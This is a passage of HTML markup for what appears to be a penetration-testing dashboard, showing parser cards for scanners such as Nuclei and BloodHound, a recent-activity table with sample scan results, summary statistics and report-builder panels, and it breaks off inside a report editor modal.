                                <div style="padding: 1.5rem;">
                                    <div style="margin-bottom: 1rem;">
                                        <div style="font-size: 0.875rem; color: var(--text-secondary); margin-bottom: 0.5rem;">Supported Formats:</div>
                                        <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
                                            <span class="tag" style="font-size: 0.75rem;">JSON Output</span>
                                            <span class="tag" style="font-size: 0.75rem;">HTML Report</span>
                                            <span class="tag" style="font-size: 0.75rem;">CSV Export</span>
                                        </div>
                                    </div>
                                    
                                    <div style="margin-bottom: 1rem;">
                                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
                                            <span style="font-size: 0.875rem; color: var(--text-secondary);">Last processed: 6 hours ago</span>
                                            <span style="font-size: 0.875rem; color: var(--warning);">8 SSL issues</span>
                                        </div>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem;">
                                        <button class="action-btn primary" style="flex: 1;" onclick="uploadFile('testssl')"> Upload Files</button>
                                        <button class="table-btn" onclick="viewIngestionHistory('testssl')" title="History"></button>
                                        <button class="table-btn" onclick="configureParser('testssl')" title="Configure"></button>
                                    </div>
                                </div>
                            </div>

                            <!-- Nuclei Parser -->
                            <div class="parser-card" style="background: var(--bg-secondary); border-radius: 12px; border: 1px solid var(--border); overflow: hidden;">
                                <div class="parser-header" style="background: linear-gradient(135deg, #ea580c, #c2410c); color: white; padding: 1.5rem;">
                                    <div style="display: flex; justify-content: space-between; align-items: start;">
                                        <div style="flex: 1;">
                                            <h3 style="margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.5rem;">
                                                 Nuclei
                                                <span class="tag" style="background: rgba(255,255,255,0.2); font-size: 0.75rem;">Fast Scanner</span>
                                            </h3>
                                            <div style="font-size: 0.875rem; opacity: 0.9;">Template-based vulnerability detection</div>
                                        </div>
                                        <div class="parser-status">
                                            <span style="color: #10b981; font-size: 1.2rem;"></span>
                                        </div>
                                    </div>
                                </div>
                                
                                <div style="padding: 1.5rem;">
                                    <div style="margin-bottom: 1rem;">
                                        <div style="font-size: 0.875rem; color: var(--text-secondary); margin-bottom: 0.5rem;">Supported Formats:</div>
                                        <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
                                            <span class="tag" style="font-size: 0.75rem;">JSON Output</span>
                                            <span class="tag" style="font-size: 0.75rem;">JSONL</span>
                                            <span class="tag" style="font-size: 0.75rem;">Markdown</span>
                                        </div>
                                    </div>
                                    
                                    <div style="margin-bottom: 1rem;">
                                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
                                            <span style="font-size: 0.875rem; color: var(--text-secondary);">Last processed: 1 hour ago</span>
                                            <span style="font-size: 0.875rem; color: var(--success);">127 templates matched</span>
                                        </div>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem;">
                                        <button class="action-btn primary" style="flex: 1;" onclick="uploadFile('nuclei')"> Upload Files</button>
                                        <button class="table-btn" onclick="viewIngestionHistory('nuclei')" title="History"></button>
                                        <button class="table-btn" onclick="configureParser('nuclei')" title="Configure"></button>
                                    </div>
                                </div>
                            </div>

                            <!-- BloodHound Parser -->
                            <div class="parser-card" style="background: var(--bg-secondary); border-radius: 12px; border: 1px solid var(--border); overflow: hidden;">
                                <div class="parser-header" style="background: linear-gradient(135deg, #b91c1c, #7f1d1d); color: white; padding: 1.5rem;">
                                    <div style="display: flex; justify-content: space-between; align-items: start;">
                                        <div style="flex: 1;">
                                            <h3 style="margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.5rem;">
                                                 BloodHound
                                                <span class="tag" style="background: rgba(255,255,255,0.2); font-size: 0.75rem;">AD Analysis</span>
                                            </h3>
                                            <div style="font-size: 0.875rem; opacity: 0.9;">Active Directory attack paths</div>
                                        </div>
                                        <div class="parser-status">
                                            <span style="color: #10b981; font-size: 1.2rem;"></span>
                                        </div>
                                    </div>
                                </div>
                                
                                <div style="padding: 1.5rem;">
                                    <div style="margin-bottom: 1rem;">
                                        <div style="font-size: 0.875rem; color: var(--text-secondary); margin-bottom: 0.5rem;">Supported Formats:</div>
                                        <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
                                            <span class="tag" style="font-size: 0.75rem;">JSON Data</span>
                                            <span class="tag" style="font-size: 0.75rem;">ZIP Archive</span>
                                            <span class="tag" style="font-size: 0.75rem;">CSV Export</span>
                                        </div>
                                    </div>
                                    
                                    <div style="margin-bottom: 1rem;">
                                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
                                            <span style="font-size: 0.875rem; color: var(--text-secondary);">Last processed: 8 hours ago</span>
                                            <span style="font-size: 0.875rem; color: var(--danger);">23 attack paths</span>
                                        </div>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem;">
                                        <button class="action-btn primary" style="flex: 1;" onclick="uploadFile('bloodhound')"> Upload Files</button>
                                        <button class="table-btn" onclick="viewIngestionHistory('bloodhound')" title="History"></button>
                                        <button class="table-btn" onclick="configureParser('bloodhound')" title="Configure"></button>
                                    </div>
                                </div>
                            </div>

                            <!-- Burp Suite Parser -->
                            <div class="parser-card" style="background: var(--bg-secondary); border-radius: 12px; border: 1px solid var(--border); overflow: hidden;">
                                <div class="parser-header" style="background: linear-gradient(135deg, #f97316, #ea580c); color: white; padding: 1.5rem;">
                                    <div style="display: flex; justify-content: space-between; align-items: start;">
                                        <div style="flex: 1;">
                                            <h3 style="margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.5rem;">
                                                 Burp Suite
                                                <span class="tag" style="background: rgba(255,255,255,0.2); font-size: 0.75rem;">Web App Security</span>
                                            </h3>
                                            <div style="font-size: 0.875rem; opacity: 0.9;">Web application security scanner</div>
                                        </div>
                                        <div class="parser-status">
                                            <span style="color: #10b981; font-size: 1.2rem;"></span>
                                        </div>
                                    </div>
                                </div>
                                
                                <div style="padding: 1.5rem;">
                                    <div style="margin-bottom: 1rem;">
                                        <div style="font-size: 0.875rem; color: var(--text-secondary); margin-bottom: 0.5rem;">Supported Formats:</div>
                                        <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
                                            <span class="tag" style="font-size: 0.75rem;">XML Report</span>
                                            <span class="tag" style="font-size: 0.75rem;">HTML Report</span>
                                            <span class="tag" style="font-size: 0.75rem;">JSON Export</span>
                                        </div>
                                    </div>
                                    
                                    <div style="margin-bottom: 1rem;">
                                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
                                            <span style="font-size: 0.875rem; color: var(--text-secondary);">Last processed: 3 hours ago</span>
                                            <span style="font-size: 0.875rem; color: var(--warning);">31 web issues</span>
                                        </div>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem;">
                                        <button class="action-btn primary" style="flex: 1;" onclick="uploadFile('burp')"> Upload Files</button>
                                        <button class="table-btn" onclick="viewIngestionHistory('burp')" title="History"></button>
                                        <button class="table-btn" onclick="configureParser('burp')" title="Configure"></button>
                                    </div>
                                </div>
                            </div>

                            <!-- Custom Parser -->
                            <div class="parser-card" style="background: var(--bg-secondary); border-radius: 12px; border: 1px solid var(--border); overflow: hidden;">
                                <div class="parser-header" style="background: linear-gradient(135deg, #6366f1, #4f46e5); color: white; padding: 1.5rem;">
                                    <div style="display: flex; justify-content: space-between; align-items: start;">
                                        <div style="flex: 1;">
                                            <h3 style="margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.5rem;">
                                                 Custom Parser
                                                <span class="tag" style="background: rgba(255,255,255,0.2); font-size: 0.75rem;">Extensible</span>
                                            </h3>
                                            <div style="font-size: 0.875rem; opacity: 0.9;">Create custom data parsers</div>
                                        </div>
                                        <div class="parser-status">
                                            <span style="color: #6b7280; font-size: 1.2rem;"></span>
                                        </div>
                                    </div>
                                </div>
                                
                                <div style="padding: 1.5rem;">
                                    <div style="margin-bottom: 1rem;">
                                        <div style="font-size: 0.875rem; color: var(--text-secondary); margin-bottom: 0.5rem;">Supported Formats:</div>
                                        <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
                                            <span class="tag" style="font-size: 0.75rem;">JSON</span>
                                            <span class="tag" style="font-size: 0.75rem;">XML</span>
                                            <span class="tag" style="font-size: 0.75rem;">CSV</span>
                                            <span class="tag" style="font-size: 0.75rem;">TXT</span>
                                        </div>
                                    </div>
                                    
                                    <div style="margin-bottom: 1rem;">
                                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem;">
                                            <span style="font-size: 0.875rem; color: var(--text-secondary);">No recent activity</span>
                                            <span style="font-size: 0.875rem; color: var(--text-secondary);">0 parsers configured</span>
                                        </div>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem;">
                                        <button class="action-btn primary" style="flex: 1;" onclick="createCustomParser()"> Create Parser</button>
                                        <button class="table-btn" onclick="viewCustomParsers()" title="View All"></button>
                                        <button class="table-btn" onclick="importParser()" title="Import"></button>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Recent Activity Section -->
                        <div style="background: var(--bg-secondary); border-radius: 12px; padding: 2rem; border: 1px solid var(--border); margin-bottom: 2rem;">
                            <h3 style="color: var(--text-primary); margin-bottom: 1.5rem; display: flex; align-items: center; gap: 0.5rem;">
                                 Recent Activity
                                <button class="btn-secondary" onclick="refreshActivity()" style="margin-left: auto;"> Refresh</button>
                            </h3>
                            
                            <div style="background: var(--bg-primary); border-radius: 8px; border: 1px solid var(--border); overflow: hidden;">
                                <table class="data-table" style="width: 100%;">
                                    <thead>
                                        <tr>
                                            <th>Timestamp</th>
                                            <th>Tool</th>
                                            <th>File</th>
                                            <th>Status</th>
                                            <th>Findings</th>
                                            <th>Actions</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <tr>
                                            <td>2024-11-20 14:32:15</td>
                                            <td>
                                                <span style="display: flex; align-items: center; gap: 0.5rem;">
                                                     Nuclei
                                                </span>
                                            </td>
                                            <td>scan_results_20241120.json</td>
                                            <td><span class="status-badge" style="background: #dcfce7; color: #16a34a;">Processed</span></td>
                                            <td><span style="color: var(--success);">127 findings</span></td>
                                            <td>
                                                <button class="table-btn" onclick="viewProcessedFile('nuclei-1')" title="View Details"></button>
                                                <button class="table-btn" onclick="reprocessFile('nuclei-1')" title="Reprocess"></button>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>2024-11-20 12:15:42</td>
                                            <td>
                                                <span style="display: flex; align-items: center; gap: 0.5rem;">
                                                     Nmap
                                                </span>
                                            </td>
                                            <td>network_scan.xml</td>
                                            <td><span class="status-badge" style="background: #dcfce7; color: #16a34a;">Processed</span></td>
                                            <td><span style="color: var(--success);">15 hosts</span></td>
                                            <td>
                                                <button class="table-btn" onclick="viewProcessedFile('nmap-1')" title="View Details"></button>
                                                <button class="table-btn" onclick="reprocessFile('nmap-1')" title="Reprocess"></button>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>2024-11-20 10:45:33</td>
                                            <td>
                                                <span style="display: flex; align-items: center; gap: 0.5rem;">
                                                     Nessus
                                                </span>
                                            </td>
                                            <td>vulnerability_scan.nessus</td>
                                            <td><span class="status-badge" style="background: #dcfce7; color: #16a34a;">Processed</span></td>
                                            <td><span style="color: var(--danger);">42 vulnerabilities</span></td>
                                            <td>
                                                <button class="table-btn" onclick="viewProcessedFile('nessus-1')" title="View Details"></button>
                                                <button class="table-btn" onclick="reprocessFile('nessus-1')" title="Reprocess"></button>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>2024-11-20 09:22:18</td>
                                            <td>
                                                <span style="display: flex; align-items: center; gap: 0.5rem;">
                                                     TestSSL
                                                </span>
                                            </td>
                                            <td>ssl_test_results.json</td>
                                            <td><span class="status-badge" style="background: #dcfce7; color: #16a34a;">Processed</span></td>
                                            <td><span style="color: var(--warning);">8 SSL issues</span></td>
                                            <td>
                                                <button class="table-btn" onclick="viewProcessedFile('testssl-1')" title="View Details"></button>
                                                <button class="table-btn" onclick="reprocessFile('testssl-1')" title="Reprocess"></button>
                                            </td>
                                        </tr>
                                        <tr>
                                            <td>2024-11-19 16:55:07</td>
                                            <td>
                                                <span style="display: flex; align-items: center; gap: 0.5rem;">
                                                     BloodHound
                                                </span>
                                            </td>
                                            <td>bloodhound_data.zip</td>
                                            <td><span class="status-badge" style="background: #fef3c7; color: #f59e0b;">Processing</span></td>
                                            <td><span style="color: var(--text-secondary);">In progress</span></td>
                                            <td>
                                                <button class="table-btn" onclick="viewProcessedFile('bloodhound-1')" title="View Details"></button>
                                                <button class="table-btn" onclick="cancelProcessing('bloodhound-1')" title="Cancel"></button>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </div>
                        </div>

                        <!-- Data Visualization Dashboard -->
                        <div style="background: var(--bg-secondary); border-radius: 12px; padding: 2rem; border: 1px solid var(--border);">
                            <h3 style="color: var(--text-primary); margin-bottom: 1.5rem;"> Data Insights</h3>
                            
                            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1.5rem;">
                                <!-- Findings by Severity -->
                                <div style="background: var(--bg-primary); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border);">
                                    <h4 style="margin-bottom: 1rem; color: var(--text-primary);">Findings by Severity</h4>
                                    <div style="display: flex; flex-direction: column; gap: 0.75rem;">
                                        <div style="display: flex; justify-content: space-between; align-items: center;">
                                            <span style="display: flex; align-items: center; gap: 0.5rem;">
                                                <div style="width: 12px; height: 12px; background: #dc2626; border-radius: 50%;"></div>
                                                Critical
                                            </span>
                                            <strong>23</strong>
                                        </div>
                                        <div style="display: flex; justify-content: space-between; align-items: center;">
                                            <span style="display: flex; align-items: center; gap: 0.5rem;">
                                                <div style="width: 12px; height: 12px; background: #ea580c; border-radius: 50%;"></div>
                                                High
                                            </span>
                                            <strong>67</strong>
                                        </div>
                                        <div style="display: flex; justify-content: space-between; align-items: center;">
                                            <span style="display: flex; align-items: center; gap: 0.5rem;">
                                                <div style="width: 12px; height: 12px; background: #f59e0b; border-radius: 50%;"></div>
                                                Medium
                                            </span>
                                            <strong>124</strong>
                                        </div>
                                        <div style="display: flex; justify-content: space-between; align-items: center;">
                                            <span style="display: flex; align-items: center; gap: 0.5rem;">
                                                <div style="width: 12px; height: 12px; background: #10b981; border-radius: 50%;"></div>
                                                Low
                                            </span>
                                            <strong>24</strong>
                                        </div>
                                    </div>
                                </div>
                                
                                <!-- Top Tools -->
                                <div style="background: var(--bg-primary); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border);">
                                    <h4 style="margin-bottom: 1rem; color: var(--text-primary);">Most Active Tools</h4>
                                    <div style="display: flex; flex-direction: column; gap: 0.75rem;">
                                        <div style="display: flex; justify-content: space-between; align-items: center;">
                                            <span> Nuclei</span>
                                            <strong>127</strong>
                                        </div>
                                        <div style="display: flex; justify-content: space-between; align-items: center;">
                                            <span> Nessus</span>
                                            <strong>42</strong>
                                        </div>
                                        <div style="display: flex; justify-content: space-between; align-items: center;">
                                            <span> Burp Suite</span>
                                            <strong>31</strong>
                                        </div>
                                        <div style="display: flex; justify-content: space-between; align-items: center;">
                                            <span> BloodHound</span>
                                            <strong>23</strong>
                                        </div>
                                    </div>
                                </div>
                                
                                <!-- Processing Stats -->
                                <div style="background: var(--bg-primary); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border);">
                                    <h4 style="margin-bottom: 1rem; color: var(--text-primary);">Processing Statistics</h4>
                                    <div style="display: flex; flex-direction: column; gap: 0.75rem;">
                                        <div style="display: flex; justify-content: space-between; align-items: center;">
                                            <span>Files Processed Today</span>
                                            <strong>12</strong>
                                        </div>
                                        <div style="display: flex; justify-content: space-between; align-items: center;">
                                            <span>Success Rate</span>
                                            <strong>94.2%</strong>
                                        </div>
                                        <div style="display: flex; justify-content: space-between; align-items: center;">
                                            <span>Avg. Processing Time</span>
                                            <strong>2.3s</strong>
                                        </div>
                                        <div style="display: flex; justify-content: space-between; align-items: center;">
                                            <span>Queue Length</span>
                                            <strong>3</strong>
                                        </div>
                                    </div>
                                </div>
                                
                                <!-- Data Growth -->
                                <div style="background: var(--bg-primary); padding: 1.5rem; border-radius: 8px; border: 1px solid var(--border);">
                                    <h4 style="margin-bottom: 1rem; color: var(--text-primary);">Data Growth (7 days)</h4>
                                    <div style="display: flex; flex-direction: column; gap: 0.75rem;">
                                        <div style="display: flex; justify-content: space-between; align-items: center;">
                                            <span>New Findings</span>
                                            <strong style="color: var(--success);">+156</strong>
                                        </div>
                                        <div style="display: flex; justify-content: space-between; align-items: center;">
                                            <span>Hosts Discovered</span>
                                            <strong style="color: var(--success);">+23</strong>
                                        </div>
                                        <div style="display: flex; justify-content: space-between; align-items: center;">
                                            <span>Services Identified</span>
                                            <strong style="color: var(--success);">+87</strong>
                                        </div>
                                        <div style="display: flex; justify-content: space-between; align-items: center;">
                                            <span>Data Volume</span>
                                            <strong style="color: var(--text-accent);">+1.2GB</strong>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <style>
                            .ingestion-grid {
                                display: grid;
                                grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
                                gap: 1.5rem;
                            }
                            
                            @media (max-width: 768px) {
                                .ingestion-grid {
                                    grid-template-columns: 1fr !important;
                                }
                            }
                            
                            .parser-card:hover {
                                transform: translateY(-2px);
                                transition: transform 0.2s ease;
                            }
                            
                            .parser-status {
                                display: flex;
                                align-items: center;
                            }
                        </style>
                    </div>
                </div>
                
                <div class="screen-content" id="reports">
                    <div class="assets-container">
                        <!-- Reports Header -->
                        <div class="assets-header">
                            <div class="assets-summary">
                                <div class="summary-item">
                                    <div class="summary-number">3</div>
                                    <div class="summary-label">Report Types</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--warning);">2</div>
                                    <div class="summary-label">In Progress</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--success);">1</div>
                                    <div class="summary-label">Complete</div>
                                </div>
                                <div class="summary-item">
                                    <div class="summary-number" style="color: var(--text-accent);">15</div>
                                    <div class="summary-label">Total Findings</div>
                                </div>
                            </div>
                            
                            <div class="assets-actions">
                                <button class="action-btn secondary" onclick="exportAllReports()"> Export All</button>
                                <button class="action-btn secondary" onclick="openReportTemplates()"> Templates</button>
                                <button class="action-btn primary" onclick="openModal('newReportModal')">+ New Report</button>
                            </div>
                        </div>

                        <!-- Report Types Grid -->
                        <div class="reports-grid" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); gap: 1.5rem; margin-bottom: 2rem;">
                            <!-- Management Report -->
                            <div class="report-card" style="background: var(--bg-secondary); border-radius: 8px; border: 1px solid var(--border); overflow: hidden;">
                                <div class="report-header" style="background: linear-gradient(135deg, var(--button-primary), #3b82f6); color: white; padding: 1.5rem;">
                                    <div style="display: flex; justify-content: space-between; align-items: start;">
                                        <div style="flex: 1;">
                                            <h3 style="margin-bottom: 0.5rem;"> Management Report</h3>
                                            <div style="font-size: 0.875rem; opacity: 0.9;">Executive summary and high-level findings</div>
                                        </div>
                                        <div style="display: flex; flex-direction: column; align-items: end; gap: 0.25rem;">
                                            <span class="tag" style="background: rgba(255,255,255,0.2); font-size: 0.75rem;">Complete</span>
                                        </div>
                                    </div>
                                </div>
                                
                                <div style="padding: 1.5rem;">
                                    <div style="margin-bottom: 1rem;">
                                        <div style="font-size: 0.875rem; color: var(--text-secondary); margin-bottom: 0.5rem;">Includes:</div>
                                        <ul style="margin: 0; padding-left: 1.5rem; line-height: 1.6; color: var(--text-secondary); font-size: 0.875rem;">
                                            <li>High Level Summary</li>
                                            <li>Executive Summary</li>
                                            <li>Finding Summary Table</li>
                                            <li>Next Steps & Recommendations</li>
                                            <li>Constraints and Limitations</li>
                                        </ul>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem; margin-bottom: 1rem;">
                                        <span class="tag" style="font-size: 0.75rem;">External</span>
                                        <span class="tag" style="font-size: 0.75rem;">Web App</span>
                                        <span class="tag" style="font-size: 0.75rem;">Infrastructure</span>
                                    </div>
                                    
                                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
                                        <div style="font-size: 0.75rem; color: var(--text-secondary);">Last updated: 1 hour ago</div>
                                        <div style="font-size: 0.75rem; color: var(--success);">32 pages</div>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem;">
                                        <button class="action-btn primary" style="flex: 1;" onclick="editReport('management')"> Edit</button>
                                        <button class="table-btn" onclick="previewReport('management')" title="Preview"></button>
                                        <button class="table-btn" onclick="exportReport('management')" title="Export"></button>
                                    </div>
                                </div>
                            </div>

                            <!-- Technical Report -->
                            <div class="report-card" style="background: var(--bg-secondary); border-radius: 8px; border: 1px solid var(--border); overflow: hidden;">
                                <div class="report-header" style="background: linear-gradient(135deg, var(--danger), #dc2626); color: white; padding: 1.5rem;">
                                    <div style="display: flex; justify-content: space-between; align-items: start;">
                                        <div style="flex: 1;">
                                            <h3 style="margin-bottom: 0.5rem;"> Technical Report</h3>
                                            <div style="font-size: 0.875rem; opacity: 0.9;">Detailed findings and technical analysis</div>
                                        </div>
                                        <div style="display: flex; flex-direction: column; align-items: end; gap: 0.25rem;">
                                            <span class="tag" style="background: rgba(255,255,255,0.2); font-size: 0.75rem;">In Progress</span>
                                        </div>
                                    </div>
                                </div>
                                
                                <div style="padding: 1.5rem;">
                                    <div style="margin-bottom: 1rem;">
                                        <div style="font-size: 0.875rem; color: var(--text-secondary); margin-bottom: 0.5rem;">Includes:</div>
                                        <ul style="margin: 0; padding-left: 1.5rem; line-height: 1.6; color: var(--text-secondary); font-size: 0.875rem;">
                                            <li>Detailed Finding Descriptions</li>
                                            <li>Technical Evidence</li>
                                            <li>Proof of Concept Code</li>
                                            <li>Remediation Steps</li>
                                            <li>Risk Assessment</li>
                                        </ul>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem; margin-bottom: 1rem;">
                                        <span class="tag" style="font-size: 0.75rem;">External</span>
                                        <span class="tag" style="font-size: 0.75rem;">Internal</span>
                                        <span class="tag" style="font-size: 0.75rem;">All Findings</span>
                                    </div>
                                    
                                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
                                        <div style="font-size: 0.75rem; color: var(--text-secondary);">Last updated: 3 hours ago</div>
                                        <div style="font-size: 0.75rem; color: var(--warning);">68% complete</div>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem;">
                                        <button class="action-btn primary" style="flex: 1;" onclick="editReport('technical')"> Edit</button>
                                        <button class="table-btn" onclick="previewReport('technical')" title="Preview"></button>
                                        <button class="table-btn" onclick="exportReport('technical')" title="Export"></button>
                                    </div>
                                </div>
                            </div>

                            <!-- Supplemental Report -->
                            <div class="report-card" style="background: var(--bg-secondary); border-radius: 8px; border: 1px solid var(--border); overflow: hidden;">
                                <div class="report-header" style="background: linear-gradient(135deg, var(--warning), #d97706); color: white; padding: 1.5rem;">
                                    <div style="display: flex; justify-content: space-between; align-items: start;">
                                        <div style="flex: 1;">
                                            <h3 style="margin-bottom: 0.5rem;"> Supplemental Report</h3>
                                            <div style="font-size: 0.875rem; opacity: 0.9;">Additional evidence and appendices</div>
                                        </div>
                                        <div style="display: flex; flex-direction: column; align-items: end; gap: 0.25rem;">
                                            <span class="tag" style="background: rgba(255,255,255,0.2); font-size: 0.75rem;">Draft</span>
                                        </div>
                                    </div>
                                </div>
                                
                                <div style="padding: 1.5rem;">
                                    <div style="margin-bottom: 1rem;">
                                        <div style="font-size: 0.875rem; color: var(--text-secondary); margin-bottom: 0.5rem;">Includes:</div>
                                        <ul style="margin: 0; padding-left: 1.5rem; line-height: 1.6; color: var(--text-secondary); font-size: 0.875rem;">
                                            <li>Screenshots & Evidence</li>
                                            <li>Network Diagrams</li>
                                            <li>Tool Output</li>
                                            <li>Raw Data</li>
                                            <li>Additional Documentation</li>
                                        </ul>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem; margin-bottom: 1rem;">
                                        <span class="tag" style="font-size: 0.75rem;">Screenshots</span>
                                        <span class="tag" style="font-size: 0.75rem;">Raw Data</span>
                                    </div>
                                    
                                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
                                        <div style="font-size: 0.75rem; color: var(--text-secondary);">Last updated: 1 day ago</div>
                                        <div style="font-size: 0.75rem; color: var(--text-secondary);">45 screenshots</div>
                                    </div>
                                    
                                    <div style="display: flex; gap: 0.5rem;">
                                        <button class="action-btn primary" style="flex: 1;" onclick="editReport('supplemental')"> Edit</button>
                                        <button class="table-btn" onclick="previewReport('supplemental')" title="Preview"></button>
                                        <button class="table-btn" onclick="exportReport('supplemental')" title="Export"></button>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Report Generation Options -->
                        <div style="background: var(--bg-secondary); border-radius: 12px; padding: 2rem; border: 1px solid var(--border);">
                            <h3 style="color: var(--text-primary); margin-bottom: 1.5rem;"> Report Generation</h3>
                            
                            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1.5rem;">
                                <div class="generation-option" onclick="generateReportPackage()" style="background: var(--bg-primary); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem; cursor: pointer; text-align: center; transition: transform 0.2s ease;">
                                    <div style="font-size: 2rem; margin-bottom: 0.75rem;"></div>
                                    <h4 style="margin-bottom: 0.5rem; color: var(--text-primary);">Complete Package</h4>
                                    <div style="color: var(--text-secondary); font-size: 0.875rem;">Generate all reports together with evidence</div>
                                </div>
                                
                                <div class="generation-option" onclick="generateExecutiveSummary()" style="background: var(--bg-primary); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem; cursor: pointer; text-align: center; transition: transform 0.2s ease;">
                                    <div style="font-size: 2rem; margin-bottom: 0.75rem;"></div>
                                    <h4 style="margin-bottom: 0.5rem; color: var(--text-primary);">Executive Only</h4>
                                    <div style="color: var(--text-secondary); font-size: 0.875rem;">Management summary without technical details</div>
                                </div>
                                
                                <div class="generation-option" onclick="generateCustomReport()" style="background: var(--bg-primary); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem; cursor: pointer; text-align: center; transition: transform 0.2s ease;">
                                    <div style="font-size: 2rem; margin-bottom: 0.75rem;"></div>
                                    <h4 style="margin-bottom: 0.5rem; color: var(--text-primary);">Custom Build</h4>
                                    <div style="color: var(--text-secondary); font-size: 0.875rem;">Choose specific sections and segments</div>
                                </div>
                            </div>
                        </div>
                        
                        <style>
                            .generation-option:hover {
                                transform: translateY(-2px);
                            }
                            
                            @media (max-width: 768px) {
                                .reports-grid {
                                    grid-template-columns: 1fr !important;
                                }
                            }
                        </style>
                    </div>
                </div>
                
                <!-- Report Editor Modal -->
                <div class="modal" id="reportEditorModal" style="display: none;">
                    <div class="modal-content" style="width: 95%; max-width: 1400px; height: 90vh; display: flex; flex-direction: column;">
                        <div class="modal-header">
                            <h2> Report Editor - <span id="reportEditorTitle">Management Report</span></h2>
                            <div style="display: flex; gap: 0.5rem; align-items: center;">
                                <button class="btn-secondary" onclick="previewReport()"> Preview</button>
                                <button class="btn-secondary" onclick="saveReport()"> Save</button>
                                <span class="close" onclick="closeModal('reportEditorModal')">&times;</span>
                            </div>
                        </div>
                        
                        <div class="modal-body" style="flex: 1; display: flex; gap: 1rem; overflow: hidden;">
                            <!-- Report Sections Sidebar -->
                            <div style="width: 250px; background: var(--bg-secondary); border-radius: 8px; border: 1px solid var(--border); display: flex; flex-direction: column;">
                                <div style="padding: 1rem; border-bottom: 1px solid var(--border);">
                                    <h3 style="margin: 0; font-size: 1rem; color: var(--text-primary);">Report Sections</h3>
                                </div>
                                
                                <div id="reportSectionsList" style="flex: 1; padding: 0.5rem; overflow-y: auto;">
                                    <div class="section-item active" onclick="selectSection('high-level')" data-section="high-level">
                                        <div class="section-icon"></div>
                                        <div class="section-info">
                                            <div class="section-name">High Level Summary</div>
                                            <div class="section-status">Template</div>
                                        </div>
                                    </div>
                                    
                                    <div class="section-item" onclick="selectSection('executive')" data-section="executive">
                                        <div class="section-icon"></div>
                                        <div class="section-info">
                                            <div class="section-name">Executive Summary</div>
                                            <div class="section-status">Free Text</div>
                                        </div>
                                    </div>
                                    
                                    <div class="section-item" onclick="selectSection('findings-table')" data-section="findings-table">
                                        <div class="section-icon"></div>
                                        <div class="section-info">
                                            <div class="section-name">Findings Summary</div>
                                            <div class="section-status">Auto-generated</div>
                                        </div>
                                    </div>
                                    
                                    <div class="section-item" onclick="selectSection('next-steps')" data-section="next-steps">
                                        <div class="section-icon"></div>
                                        <div class="section-info">
                                            <div class="section-name">Next Steps</div>
                                            <div class="section-status">Structured</div>
                                        </div>
                                    </div>
                                    
                                    <div class="section-item" onclick="selectSection('constraints')" data-section="constraints">
                                        <div class="section-icon"></div>
                                        <div class="section-info">
                                            <div class="section-name">Constraints</div>
                                            <div class="section-status">Free Text</div>
                                        </div>
                                    </div>
                                </div>
                                
                                <div style="padding: 1rem; border-top: 1px solid var(--border);">
                                    <button class="action-btn secondary" style="width: 100%;" onclick="addReportSection()">+ Add Section</button>
                                </div>
                            </div>
                            
                            <!-- Report Content Editor -->
                            <div style="flex: 1; display: flex; flex-direction: column; background: var(--bg-secondary); border-radius: 8px; border: 1px solid var(--border);">
                                <div style="padding: 1rem; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center;">
                                    <h3 id="currentSectionTitle" style="margin: 0; color: var(--text-primary);">High Level Summary</h3>
                                    <div style="display: flex; gap: 0.5rem;">
                                        <button class="table-btn" onclick="moveSectionUp()" title="Move Up"></button>
                                        <button class="table-btn" onclick="moveSectionDown()" title="Move Down"></button>
                                        <button class="table-btn" onclick="deleteSection()" title="Delete" style="color: var(--danger);"></button>
                                    </div>
                                </div>
                                
